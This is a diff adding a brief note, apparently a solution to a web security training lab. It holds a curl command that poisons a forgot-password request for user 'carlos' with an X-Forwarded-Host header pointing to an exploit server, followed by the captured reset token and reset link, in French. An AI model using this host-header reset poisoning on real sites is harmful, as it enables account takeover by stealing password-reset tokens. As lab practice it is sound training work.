@@ -1,0 +1,10 @@
+curl -X POST "https://0a6300cb032d1366808203b5003f00e8.web-security-academy.net/forgot-password" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -H "Host: 0a6300cb032d1366808203b5003f00e8.web-security-academy.net" \
+  -H "X-Forwarded-Host: exploit-0a400039032d139480e00247014400b1.exploit-server.net" \
+  --data-urlencode "username=carlos"
+
+
+Token récupérée : we3hxe5c5u2y5uspt9zvp4a4n0ads857
+
+Lien vers la page : https://0a6300cb032d1366808203b5003f00e8.web-security-academy.net/forgot-password?temp-forgot-password-token=we3hxe5c5u2y5uspt9zvp4a4n0ads857
